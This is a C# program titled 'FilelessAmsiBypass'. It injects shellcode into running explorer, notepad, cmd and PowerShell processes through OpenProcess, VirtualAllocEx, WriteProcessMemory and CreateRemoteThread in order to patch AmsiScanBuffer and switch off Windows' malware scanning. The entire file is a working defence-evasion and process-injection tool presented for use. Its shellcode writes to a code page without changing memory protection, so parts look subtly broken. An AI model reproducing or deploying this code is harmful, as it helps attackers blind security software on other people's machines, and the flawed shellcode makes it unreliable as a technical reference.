using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq;

namespace FilelessAmsiBypass
{
    class Program
    {
        // Interaction with processes
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint MEM_COMMIT = 0x1000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            // Find processes
            string[] targetProcesses = { "explorer", "notepad", "cmd", "powershell" };
            foreach (var processName in targetProcesses)
            {
                var processes = Process.GetProcessesByName(processName);
                foreach (var process in processes)
                {
                    try
                    {
                        int pid = process.Id;
                        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
                        if (hProcess == IntPtr.Zero)
                        {
                            Console.WriteLine($" Couldn't access the process {processName} (PID: {pid})");
                            continue;
                        }

                        // Deactivate AMSI
                        byte[] shellcode = new byte[]
                        {
                            0x48, 0x83, 0xEC, 0x28,                     // sub rsp, 0x28
                            0x48, 0x31, 0xC0,                           // xor rax, rax
                            0x48, 0xB8, /* AmsiScanBuffer Adress, filled in real time */ 0, 0, 0, 0, 0, 0, 0, 0,
                            0x48, 0xC7, 0x00, 0xC3, 0x00, 0x07, 0x80, // mov dword ptr [rax], 0x800700C3
                            0x48, 0x83, 0xC4, 0x28,                     // add rsp, 0x28
                            0xC3                                        // ret
                        };

                        // Get AmsiScanBuffer Address in AMSI.DLL
                        IntPtr hAmsi = GetModuleHandle("amsi.dll");
                        IntPtr amsiAddr = GetProcAddress(hAmsi, "AmsiScanBuffer");

                        // Fill the adresss with shellcode
                        byte[] addrBytes = BitConverter.GetBytes(amsiAddr.ToInt64());
                        Array.Copy(addrBytes, 0, shellcode, 8, addrBytes.Length);

                        // Alocates memory on remote process
                        IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

                        // Writes the shellcode in the remote process
                        WriteProcessMemory(hProcess, allocMem, shellcode, (uint)shellcode.Length, out _);

                        // Creates a remote thread to execute the shellcode
                        CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMem, IntPtr.Zero, 0, out _);

                        Console.WriteLine($"AMSI disabled remotely '{processName}' (PID {pid}).");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Failed to inject on  {processName}: {ex.Message}");
                    }
                }
            }

            Console.WriteLine("Injection Completed. Press any key to finish it ;).");
            Console.ReadLine();
        }
    }
}
